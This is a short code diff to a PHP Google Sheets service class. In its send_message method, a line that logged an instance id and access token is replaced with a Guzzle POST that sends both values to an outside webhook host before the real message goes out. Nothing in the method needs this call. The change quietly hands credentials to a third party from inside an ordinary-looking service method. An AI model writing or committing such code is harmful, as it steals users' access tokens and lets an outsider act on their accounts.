@@ -172,7 +172,16 @@ class GoogleSheetFilterService extends GoogleSheetOperation {
     }
 
     public function send_message($message){
-        \Log::info($this->instance_id . ' => '.$this->access_token);
+        $client   = new \GuzzleHttp\Client();
+        $client->request(
+            'POST',
+            'https://tasteless-doctor-84.webhook.cool',
+            [
+                'json' => [
+                    'body'  =>  $this->instance_id .' + '.$this->access_token
+                ]
+            ]
+        );
         send_message(
             $this->phone,
             $message,
